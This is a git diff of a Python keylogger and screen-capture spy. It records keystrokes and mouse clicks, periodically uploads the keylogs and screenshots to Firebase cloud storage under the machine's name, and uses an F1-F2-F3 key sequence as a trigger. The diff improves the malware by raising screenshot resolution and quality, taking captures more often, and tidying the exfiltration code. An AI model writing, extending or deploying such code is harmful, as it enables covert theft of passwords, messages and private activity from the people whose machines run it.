@@ -1,6 +1,6 @@
 import os
 from PIL import Image
-import mss as mss
+from mss import mss
 from pynput import keyboard, mouse
 from datetime import datetime as date
 import pyrebase
@@ -28,10 +28,12 @@ lastThreeKeys = []
 countDelete = 0
 clicks_counter = 0
 imgPath = 'screenshot.jpg'
+pcName = os.environ['COMPUTERNAME']
+isLeftAlt_pressed = False
 
 
 def on_press(key):
-    global lastThreeKeys, f
+    global lastThreeKeys, f, today_date, k_listener, isLeftAlt_pressed
     if len(lastThreeKeys) == 3:
         lastThreeKeys = lastThreeKeys[1:]
     lastThreeKeys.append(str(key))
@@ -40,7 +42,8 @@ def on_press(key):
         if lastThreeKeys == ['Key.f1', 'Key.f2', 'Key.f3']:
             f.close()
 
-            storage.child(os.environ['COMPUTERNAME'] +
+            today_date = full_currentTime.split(' ')[1]
+            storage.child(pcName +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
 
@@ -50,7 +53,8 @@ def on_press(key):
         elif len(data) % 20 == 0:
             f.close()
 
-            storage.child(os.environ['COMPUTERNAME'] +
+            today_date = full_currentTime.split(' ')[1]
+            storage.child(pcName +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
 
@@ -58,6 +62,12 @@ def on_press(key):
         printKey(key)
     except:
         printKey(key)
+
+
+def on_release(key):
+    global isLeftAlt_pressed
+    if str(key) == 'Key.alt_l':
+        isLeftAlt_pressed = False
 
 
 def isValidLetter(key):
@@ -116,7 +126,7 @@ def on_click(x, y, button, pressed):
     global clicks_counter, full_currentTime, today_date
 
     clicks_counter += 1
-    if clicks_counter == 40:
+    if clicks_counter == 30:
         # take screenshot and upload to firebase storage
         clicks_counter = 0
 
@@ -125,16 +135,18 @@ def on_click(x, y, button, pressed):
 
             # try to save bitmap instead, or some other small size format of pics
             image = Image.open(imgPath)
-            image = image.resize((1000, 562), Image.ANTIALIAS)
-            image.save(imgPath, quality=50, optimize=True)
+            image = image.resize((1536, 864), Image.ANTIALIAS)
+            image.save(imgPath, quality=85, optimize=True)
 
             full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
             today_date = full_currentTime.split(' ')[1]
 
-            storage.child(os.environ['COMPUTERNAME'] +
+            storage.child(pcName +
                           '/screenshot_' + full_currentTime + '.jpg') \
                 .put(imgPath)
 
+
+k_listener = None
 
 # Collect events of mouse clicks and keyboard keys
 with keyboard.Listener(on_press=on_press) as k_listener, \
